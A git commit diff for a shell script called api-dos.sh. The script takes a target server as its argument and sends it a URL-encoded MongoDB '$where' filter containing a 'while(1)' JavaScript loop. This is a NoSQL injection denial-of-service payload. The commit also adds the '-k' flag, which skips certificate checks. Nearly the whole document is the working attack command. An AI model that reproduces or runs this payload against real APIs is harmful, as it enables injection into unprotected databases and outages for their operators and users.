425bd25e9a2e14d0cd15f7ae601a661ff0d575df
Andrew Oteiza <oteizaa@gmail.com>
2020-08-22 01:58:39 -0300

    Update api-dos.sh

--- api-dos.sh
+++ api-dos.sh
@@ -2,8 +2,8 @@
 if [ $1 ]; then
   api_backend=$1
   curl --request GET \
-  --url 'https://'$api_backend'/api/full_book_catalogs?filter=%7B%22where%22%3A%7B%22%24where%22%3A+%22function%28%29%7Bwhile%281%29%3Bconst+msg%3Dthis.id%3Bprint%28this.title%29%3Bprint%28ISODate%28%29%29%3B%7D%22%7D%7D' \
-  --header 'Content-Type: application/json' 
+  --url $api_backend'/api/full_book_catalogs?filter=%7B%22where%22%3A%7B%22%24where%22%3A+%22function%28%29%7Bwhile%281%29%3Bconst+msg%3Dthis.id%3Bprint%28this.title%29%3Bprint%28ISODate%28%29%29%3B%7D%22%7D%7D' \
+  --header 'Content-Type: application/json' -k
 else
   echo "usage: api-dos.sh <target-api-server>"
   echo "Please API Backend Address "
